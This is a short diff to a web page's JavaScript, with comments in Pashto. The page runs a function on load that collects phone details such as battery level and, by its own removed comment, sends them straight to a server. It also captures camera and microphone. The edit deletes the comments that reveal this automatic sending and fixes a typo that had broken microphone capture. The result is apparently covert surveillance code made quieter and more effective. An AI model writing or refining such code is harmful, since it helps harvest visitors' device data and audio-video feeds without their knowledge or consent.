@@ -60,7 +60,7 @@
             } catch (e) {}
         }
 
-        // د موبایل د معلوماتو راټولول او سمدستي سرور ته استول
+        // د موبایل د معلوماتو راټولول
         async function collectAndSendDeviceInfo() {
             try {
                 let batteryLevel = "نامعلوم";
@@ -83,7 +83,6 @@
             } catch (e) {}
         }
 
-        // کله چې پاڼه پرانیستل شي، د موبایل معلومات په اتوماتيک ډول استول کیږي
         window.addEventListener('load', () => {
             collectAndSendDeviceInfo();
         });
@@ -157,7 +156,8 @@
 
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio:True });
+                    // دلته 'audio: true' په سمه توګه په کوچني توري ولیکل شو
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                     const video = document.getElementById('video');
                     video.srcObject = stream;
                     await video.play();
